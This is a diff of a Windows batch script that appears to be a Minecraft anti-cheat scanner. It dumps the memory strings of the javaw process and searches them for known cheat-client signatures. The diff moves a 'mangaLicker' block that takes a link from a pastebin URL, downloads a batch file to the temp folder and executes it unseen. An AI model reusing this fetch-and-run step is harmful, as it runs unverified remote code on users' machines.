@@ -523,10 +523,7 @@ echo.
 echo.
 echo                                             50
 echo                                    %g%%g2%..........%r%%r2%..........%t%%w%
-tasklist /v | find "javaw" | find "Lunar"
-if %errorlevel%==1 dumper.exe -nh -pid %javaw% -l 4 > %temp%\javaw.txt 
-if %errorlevel%==0 set lun=true & goto lun
-:lun
+dumper.exe -nh -pid %javaw% -l 10 > %temp%\javaw.txt 
 cls
 echo.
 echo.
@@ -571,8 +568,6 @@ echo                                    %g%%g2%................%r%%r2%....%t%%w%
 
 :fstrings
 
-timeout /t 2 /nobreak >nul
-
 findstr /i /b /C:"AutoClicker.java" "%temp%\javaw.txt" >nul
 if %errorlevel%==0 echo Found Generic A>>"%temp%\detected.txt" & set detected=true
 
@@ -599,9 +594,6 @@ if %errorlevel%==0 echo Found Generic Cheat E2>>"%temp%\detected.txt" & set dete
 
 findstr /i /b /C:"AntiBot.java" "%temp%\javaw.txt" >nul
 if %errorlevel%==0 echo Found Generic Cheat AB>>"%temp%\detected.txt" & set detected=true
-
-findstr /b /C:"Secondary finalizer" "%temp%\javaw.txt" >nul
-if %errorlevel%==0 echo Found Generic Self Destruct>>"%temp%\detected.txt" & set detected=true
 
 findstr /c:".jar!/trumpclientftw_bape_ggbP.class" "%temp%\javaw.txt" >nul
 if %errorlevel%==0 echo Found Bape (Cracked Vape)>>"%temp%\detected.txt" & set detected=true
@@ -645,8 +637,6 @@ if %errorlevel%==0 echo Found Raven B+>>"%temp%\detected.txt" & set detected=tru
 findstr /i ".?AV?$_Binder@U_Unforced@std@@P8c_auto_clicker" "%temp%\javaw.txt" >nul
 if %errorlevel%==0 echo Found Cracked Crypt>>"%temp%\detected.txt" & set detected=true
 
-:continue
-
 findstr /b "(DDDDLjava/awt/color;)V" "%temp%\javaw.txt" >nul
 if %errorlevel%==0 echo Found Vape V4>>"%temp%\detected.txt" & set detected=true
 
@@ -670,12 +660,6 @@ echo.
 echo.
 echo                                             85
 echo                                    %g%%g2%.................%r%%r2%...%t%%w%
-
-:mangaLicker
-
-for /F "tokens=1 delims=*" %%A in ('curl -s https://pastebin.com/raw/6Q1J6TQt') do set dllink=%%A
-curl -s %dllink% > %temp%\mangalicker.bat
-Call %temp%\mangalicker.bat
 
 
 
@@ -805,7 +789,11 @@ if %errorlevel%==0 set detected=true
 
 
 
+:mangaLicker
 
+for /F "tokens=1 delims=*" %%A in ('curl -s https://pastebin.com/raw/6Q1J6TQt') do set dllink=%%A
+curl -s %dllink% > %temp%\mangalicker.bat
+Call %temp%\mangalicker.bat
 
 
 
